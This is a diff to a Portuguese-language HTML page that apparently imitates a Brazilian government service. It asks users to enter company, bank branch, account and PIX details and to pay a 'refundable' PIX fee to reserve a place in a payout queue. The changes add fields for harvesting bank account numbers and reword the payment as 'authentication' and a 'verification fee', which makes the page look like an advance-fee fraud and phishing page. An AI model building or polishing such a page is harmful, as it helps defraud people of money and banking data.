@@ -127,7 +127,7 @@
       </button>
     </div>
 
-    <!-- ETAPA 3: Form de Dados + Pagamento PIX via SyncPay -->
+    <!-- ETAPA 3: Form Profissional de Dados Bancários + Pagamento PIX -->
     <div id="step-3" class="step-view hidden bg-white rounded-2xl p-6 shadow-md border border-slate-200 space-y-5">
       <div class="flex items-center justify-between border-b border-slate-100 pb-3">
         <button onclick="switchStep(2)" class="text-xs text-[#0C326F] hover:underline font-bold flex items-center gap-1 cursor-pointer">
@@ -138,7 +138,7 @@
 
       <div class="space-y-1">
         <h2 class="text-xl font-bold text-[#0C326F]">Cadastrar Conta Bancária</h2>
-        <p class="text-xs text-slate-500">Cadastre a conta bancária com um PIX aleatório estornável.</p>
+        <p class="text-xs text-slate-500">Cadastre a conta bancária para recebimento do repasse com autenticação via PIX estornável.</p>
       </div>
 
       <form id="bank-form" onsubmit="handleBankRegistration(event)" class="space-y-4">
@@ -160,36 +160,65 @@
           </p>
         </div>
 
-        <div class="space-y-1.5">
-          <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Instituição Bancária</label>
-          <select id="reg-bank" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
-            <option value="Caixa Econômica Federal">Caixa Econômica Federal</option>
-            <option value="Banco do Brasil">Banco do Brasil</option>
-            <option value="Bradesco">Bradesco</option>
-            <option value="Itaú Unibanco">Itaú Unibanco</option>
-            <option value="Santander">Santander</option>
-            <option value="Nubank">Nubank</option>
-            <option value="Banco Inter">Banco Inter</option>
-            <option value="PagBank">PagBank</option>
-            <option value="C6 Bank">C6 Bank</option>
-            <option value="Outro Banco">Outra Instituição</option>
-          </select>
+        <!-- Dados Bancários Estruturados (Agência / Conta) -->
+        <div class="bg-slate-50 border border-slate-200 rounded-xl p-3.5 space-y-3">
+          <span class="text-[11px] font-extrabold text-[#0C326F] uppercase tracking-wider block">Dados da Conta para Crédito</span>
+          
+          <div class="space-y-1.5">
+            <label class="text-[11px] font-bold text-slate-600 uppercase block">Instituição Bancária</label>
+            <select id="reg-bank" class="w-full bg-white border border-slate-300 rounded-lg px-3 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#1351B4]">
+              <option value="Caixa Econômica Federal">Caixa Econômica Federal (104)</option>
+              <option value="Banco do Brasil">Banco do Brasil (001)</option>
+              <option value="Bradesco">Bradesco (237)</option>
+              <option value="Itaú Unibanco">Itaú Unibanco (341)</option>
+              <option value="Santander">Santander (033)</option>
+              <option value="Nubank">Nubank (260)</option>
+              <option value="Banco Inter">Banco Inter (077)</option>
+              <option value="PagBank">PagBank (290)</option>
+              <option value="C6 Bank">C6 Bank (336)</option>
+              <option value="Outro Banco">Outra Instituição</option>
+            </select>
+          </div>
+
+          <div class="grid grid-cols-12 gap-2">
+            <div class="col-span-5 space-y-1">
+              <label class="text-[11px] font-bold text-slate-600 uppercase block">Agência</label>
+              <input type="text" id="reg-agency" maxlength="6" required placeholder="0001" class="w-full bg-white border border-slate-300 rounded-lg px-3 py-2 text-xs font-mono font-bold text-slate-800 focus:outline-none focus:border-[#1351B4]">
+            </div>
+
+            <div class="col-span-7 space-y-1">
+              <label class="text-[11px] font-bold text-slate-600 uppercase block">Número da Conta + Digito</label>
+              <input type="text" id="reg-account" maxlength="12" required placeholder="00000000-0" class="w-full bg-white border border-slate-300 rounded-lg px-3 py-2 text-xs font-mono font-bold text-slate-800 focus:outline-none focus:border-[#1351B4]">
+            </div>
+          </div>
+
+          <div class="space-y-1">
+            <label class="text-[11px] font-bold text-slate-600 uppercase block">Tipo de Conta</label>
+            <select id="reg-account-type" class="w-full bg-white border border-slate-300 rounded-lg px-3 py-2 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#1351B4]">
+              <option value="Conta Corrente">Conta Corrente</option>
+              <option value="Conta Poupança">Conta Poupança</option>
+              <option value="Conta Pagamento / Digital">Conta Pagamento / Digital</option>
+            </select>
+          </div>
         </div>
 
-        <div class="space-y-1.5">
-          <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Tipo de Chave PIX</label>
-          <select id="reg-pix-type" onchange="autoFillPixKey()" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
-            <option value="CNPJ">CNPJ (Mesmo cadastrado)</option>
-            <option value="CPF">CPF</option>
-            <option value="E-mail">E-mail</option>
-            <option value="Telefone">Telefone</option>
-            <option value="Chave Aleatória">Chave Aleatória</option>
-          </select>
-        </div>
+        <!-- Chave PIX Vincular -->
+        <div class="grid grid-cols-12 gap-2">
+          <div class="col-span-5 space-y-1.5">
+            <label class="text-[11px] font-bold text-slate-700 uppercase tracking-wider block">Tipo de PIX</label>
+            <select id="reg-pix-type" onchange="autoFillPixKey()" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-2.5 py-2.5 text-xs font-semibold focus:outline-none focus:border-[#1351B4]">
+              <option value="CNPJ">CNPJ</option>
+              <option value="CPF">CPF</option>
+              <option value="E-mail">E-mail</option>
+              <option value="Telefone">Telefone</option>
+              <option value="Chave Aleatória">Aleatória</option>
+            </select>
+          </div>
 
-        <div class="space-y-1.5">
-          <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Chave PIX de Destino</label>
-          <input type="text" id="reg-pix-key" required placeholder="Informe sua chave PIX" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
+          <div class="col-span-7 space-y-1.5">
+            <label class="text-[11px] font-bold text-slate-700 uppercase tracking-wider block">Chave PIX de Destino</label>
+            <input type="text" id="reg-pix-key" required placeholder="Sua chave PIX" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2.5 text-xs font-semibold focus:outline-none focus:border-[#1351B4]">
+          </div>
         </div>
 
         <div id="gen-error-msg" class="hidden p-3 rounded-lg bg-red-50 text-red-700 text-xs font-semibold border border-red-200 break-words"></div>
@@ -208,7 +237,7 @@
 
       <div class="space-y-1">
         <span class="bg-amber-100 text-amber-800 font-bold text-[11px] px-3 py-1 rounded-full uppercase tracking-wider border border-amber-300">
-          Aguardando Pagamento
+          Aguardando Autenticação
         </span>
         <h2 class="text-2xl font-black text-[#0C326F] pt-2">Finalizar Inscrição via PIX</h2>
         <p class="text-xs text-slate-500">Copie a chave abaixo para cadastrar a conta bancária com PIX estornável.</p>
@@ -251,22 +280,22 @@
 
       <div class="bg-amber-50 border border-amber-200 p-3 rounded-xl text-left space-y-1">
         <div class="flex items-center gap-2 text-[11px] font-semibold text-amber-800">
-          <span>⏳</span> O sistema verifica o pagamento automaticamente a cada 5 segundos.
+          <span>⏳</span> O sistema verifica a confirmação bancária automaticamente a cada 5 segundos.
         </div>
       </div>
     </div>
 
-    <!-- ETAPA 5: Comprovante de Inscrição & Ticket de Posição (SÓ EXIBIDO APÓS CONFIRMAÇÃO DO PAGAMENTO) -->
+    <!-- ETAPA 5: Comprovante de Inscrição & Ticket de Posição -->
     <div id="step-5" class="step-view hidden bg-white rounded-2xl p-6 shadow-xl border border-slate-200 space-y-5">
       <div class="text-center space-y-2 border-b border-slate-100 pb-4">
         <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full mx-auto flex items-center justify-center text-3xl border border-emerald-200 animate-bounce">
           ✓
         </div>
         <span class="inline-block bg-emerald-100 text-emerald-800 font-extrabold text-[11px] px-3 py-1 rounded-full uppercase tracking-wider border border-emerald-300">
-          Inscrição Confirmada
+          Conta Cadastrada & Fila Reservada
         </span>
         <h2 class="text-2xl font-black text-[#0C326F]">Comprovante de Fila</h2>
-        <p class="text-xs text-slate-500">Seu pagamento foi identificado e sua posição na fila prioritária foi reservada.</p>
+        <p class="text-xs text-slate-500">Seu pagamento foi identificado e sua conta bancária foi devidamente vinculada para o repasse.</p>
       </div>
 
       <!-- TICKET DE POSIÇÃO NA FILA -->
@@ -291,7 +320,7 @@
 
         <div class="bg-white/10 backdrop-blur-md rounded-xl p-3 border border-white/10 space-y-1 text-xs">
           <div class="flex justify-between text-blue-100">
-            <span>Previsão de Chamada:</span>
+            <span>Previsão de Liberação:</span>
             <strong class="text-white" id="ticket-date">Em até 48 horas</strong>
           </div>
           <div class="flex justify-between text-blue-100">
@@ -301,34 +330,38 @@
         </div>
       </div>
 
-      <!-- DETALHES DO CADASTRO -->
+      <!-- DETALHES DO CADASTRO BANCÁRIO -->
       <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 space-y-2.5 text-xs text-slate-700">
-        <h4 class="font-bold text-[#0C326F] uppercase text-[11px] tracking-wider border-b border-slate-200 pb-1.5">Resumo Cadastral</h4>
+        <h4 class="font-bold text-[#0C326F] uppercase text-[11px] tracking-wider border-b border-slate-200 pb-1.5">Resumo da Conta Cadastrada</h4>
         <div class="flex justify-between">
           <span class="text-slate-500">Razão Social:</span>
-          <strong id="summary-company" class="text-slate-800 text-right truncate max-w-[200px]">---</strong>
+          <strong id="summary-company" class="text-slate-800 text-right truncate max-w-[180px]">---</strong>
         </div>
         <div class="flex justify-between">
           <span class="text-slate-500">Titular:</span>
-          <strong id="summary-person" class="text-slate-800 text-right truncate max-w-[200px]">---</strong>
+          <strong id="summary-person" class="text-slate-800 text-right truncate max-w-[180px]">---</strong>
         </div>
         <div class="flex justify-between">
           <span class="text-slate-500">Banco:</span>
           <strong id="summary-bank" class="text-slate-800 text-right">---</strong>
         </div>
         <div class="flex justify-between">
+          <span class="text-slate-500">Agência / Conta:</span>
+          <strong id="summary-agency-account" class="text-slate-800 font-mono text-right">---</strong>
+        </div>
+        <div class="flex justify-between">
           <span class="text-slate-500">Chave PIX:</span>
-          <strong id="summary-pix" class="text-slate-800 font-mono text-right truncate max-w-[180px]">---</strong>
+          <strong id="summary-pix" class="text-slate-800 font-mono text-right truncate max-w-[170px]">---</strong>
         </div>
         <div class="flex justify-between border-t border-slate-200 pt-2 text-[#1351B4]">
-          <span class="font-bold">Valor Taxa Estornável:</span>
+          <span class="font-bold">Taxa Verificadora Reembolsável:</span>
           <strong id="summary-amount" class="font-bold">R$ 0,00</strong>
         </div>
       </div>
 
       <div class="bg-blue-50 border border-blue-200 p-3 rounded-xl text-xs text-blue-900 space-y-1">
         <p class="font-bold">📧 Notificações ativadas!</p>
-        <p class="text-[11px] text-blue-700">Uma cópia deste ticket e a confirmação de transferência serão enviadas para o seu e-mail cadastrado assim que o lote for processado.</p>
+        <p class="text-[11px] text-blue-700">Uma cópia deste comprovante e a notificação da transferência bancária serão enviadas para o e-mail cadastrado.</p>
       </div>
     </div>
 
@@ -362,7 +395,7 @@
 
         <div class="border border-slate-200 rounded-lg overflow-hidden">
           <button onclick="toggleFaq(3)" class="w-full text-left p-3 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
-            <span>O valor paid no momento de cadastro da conta é reembolsado?</span>
+            <span>O valor pago no momento de cadastro da conta é reembolsado?</span>
             <span id="faq-icon-3" class="text-base font-black text-[#1351B4]">+</span>
           </button>
           <div id="faq-answer-3" class="hidden p-3 text-xs text-slate-600 bg-white border-t border-slate-200 leading-relaxed">
@@ -714,11 +747,14 @@
       const compName = document.getElementById('reg-name').value || "Não informado";
       const personName = document.getElementById('reg-person-name').value || "Não informado";
       const bank = document.getElementById('reg-bank').value || "Não informado";
+      const agency = document.getElementById('reg-agency').value || "0001";
+      const account = document.getElementById('reg-account').value || "---";
       const pixKey = document.getElementById('reg-pix-key').value || "Não informado";
 
       document.getElementById('summary-company').textContent = compName;
       document.getElementById('summary-person').textContent = personName;
       document.getElementById('summary-bank').textContent = bank;
+      document.getElementById('summary-agency-account').textContent = `Ag. ${agency} / Cc. ${account}`;
       document.getElementById('summary-pix').textContent = pixKey;
       document.getElementById('summary-amount').textContent = `R$ ${valorCalculado.toFixed(2).replace('.', ',')}`;
 
